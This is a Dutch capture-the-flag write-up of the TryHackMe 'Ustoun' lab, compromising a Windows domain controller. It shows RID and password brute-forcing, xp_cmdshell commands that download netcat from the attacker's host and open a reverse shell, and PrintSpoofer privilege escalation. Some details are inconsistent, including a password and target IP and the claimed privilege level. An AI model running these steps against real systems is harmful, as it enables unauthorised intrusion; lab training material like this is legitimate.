---
title: Try Hack Me - Ustoun
author: Nicolas Bouquiaux
date: '2021-04-11'
subject: Markdown
keywords:
  - Markdown
  - Example
lang: nl
---

# THM - Ustoun - Write-up\(NL\)

[https://tryhackme.com/room/ustoun](https://tryhackme.com/room/ustoun)

## Target information

* Name: DC01
* IP: 10.10.150.225 \(export ip=10.10.150.225\)

## Enumeration

nmap geeft volgende output over onze target:

```bash
Nmap scan report for dc.ustoun.local (10.10.150.225)
Host is up, received reset ttl 127 (0.078s latency).
Scanned at 2021-04-10 19:33:37 EDT for 160s

PORT      STATE SERVICE        REASON          VERSION
53/tcp    open  domain         syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec   syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2021-04-10 23:33:47Z)
135/tcp   open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn    syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap           syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?  syn-ack ttl 127
464/tcp   open  kpasswd5?      syn-ack ttl 127
593/tcp   open  ncacn_http     syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped     syn-ack ttl 127
3268/tcp  open  ldap           syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped     syn-ack ttl 127
3389/tcp  open  ms-wbt-server? syn-ack ttl 127
| ssl-cert: Subject: commonName=DC.ustoun.local
| Issuer: commonName=DC.ustoun.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-31T19:39:34
| Not valid after:  2021-08-02T19:39:34
| MD5:   fce5 375e 0190 ebc1 bf6e f384 468f 69f6
| SHA-1: dbe7 28d6 1980 1221 c9cb 712a 911e 99b2 303e 5de7
|_ssl-date: 2021-04-10T23:36:15+00:00; +4s from scanner time.
5985/tcp  open  http           syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http           syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http     syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49713/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49715/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
49727/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC

---
```

Er zijn heel wat poorten open. Het lijkt me interessant om te kijken of we iets met MSSQL kunnen doen.

## Enumerating users AD

zo te zien heeft crackmapexec een aantal users en groepen gevonden gebruikmakend van de 'guest'-user:

```bash
──(root💀kali)-[~/CTF-Write-Ups/THM_ustoun]
└─# crackmapexec smb dc.ustoun.local -u 'guest' -p '' --rid-brute
SMB         10.10.150.225   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
SMB         10.10.150.225   445    DC               [+] ustoun.local\guest: 
SMB         10.10.150.225   445    DC               [+] Brute forcing RIDs
SMB         10.10.150.225   445    DC               498: DC01\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.150.225   445    DC               500: DC01\Administrator (SidTypeUser)
SMB         10.10.150.225   445    DC               501: DC01\Guest (SidTypeUser)
SMB         10.10.150.225   445    DC               502: DC01\krbtgt (SidTypeUser)
SMB         10.10.150.225   445    DC               512: DC01\Domain Admins (SidTypeGroup)
SMB         10.10.150.225   445    DC               513: DC01\Domain Users (SidTypeGroup)
SMB         10.10.150.225   445    DC               514: DC01\Domain Guests (SidTypeGroup)
```

Het blijkt dat de account geen lockout policy heeft, dus gaan we het wachtwoord brute-force mbv het rockyou-bestand.

```bash
┌──(root💀kali)-[~/CTF-Write-Ups/THM_ustoun]
└─# crackmapexec smb dc.ustoun.local -u 'SVC-Kerb' -p /opt/tools/SecLists/Passwords/rockyou.txt 
SMB         10.10.150.225   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:123456 STATUS_LOGON_FAILURE 

   10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:fuckyou STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:123123 STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:football STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:secret STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:andrea STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:carlos STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:jennifer STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:joshua STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:bubbles STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [-] ustoun.local\SVC-Kerb:1234567890 STATUS_LOGON_FAILURE 
SMB         10.10.150.225   445    DC               [+] ustoun.local\SVC-Kerb:REDACTED
```

dus we proberen via mysql in te loggen

```bash
┌──(root💀kali)-[~/CTF-Write-Ups/THM_ustoun]
└─# mssql -s 10.10.150.225 -u 'SVC-Kerb' -p 'superman'
Connecting to 10.10.150.225...done

sql-cli version 0.6.2
Enter ".help" for usage hints.
mssql>
```

## Getting a shell

via sqli probeer ik nc te downloaden, maar ik moet eerst een map aanmaken

```bash
Executed in 1 ms
mssql> EXEC xp_cmdshell 'mkdir c:\zeeqa'
output
------
null  

1 row(s) returned

Executed in 1 ms
mssql> EXEC xp_cmdshell 'powershell -c curl http://10.8.180.107:80/nc.exe -o c:\zeeqa\nc.exe'
output
------
```

Daarna start ik de listener en krijg ik een reverse shell

```bash
Executed in 1 ms
mssql> EXEC xp_cmdshell 'c:\zeeqa\nc.exe -e cmd 10.8.180.107 9999'
mssql>
```

```bash
└─# nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.8.180.107] from (UNKNOWN) [10.10.253.16] 49848
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.
```

## Privilege escalation

Tijdens het uitvoeren van `whoami /priv` blijkt het account `SeImpersonatePrivilege` heeft

```bash
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Dat lijkt me een mogelijkheid om een methode genaamd PrintSpoofer te gebruiken. Die moet ik uiteraard eerst zien te downloaden van mijn machine

```bash
C:\Windows\system32>powershell -c curl http://10.8.180.107:80/PrintSpoofer.exe -o c:\zeeqa\pspoo.exe
powershell -c curl http://10.8.180.107:80/PrintSpoofer.exe -o c:\zeeqa\pspoo.exe
```

Daarna moet ik gewoon het commando uitvoeren om mijn privileges te escalaten:

```bash
c:\zeeqa>pspoo.exe -c cmd -i
pspoo.exe -c cmd -i
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
dc01\dc$
```

En voila, we zijn Administator!

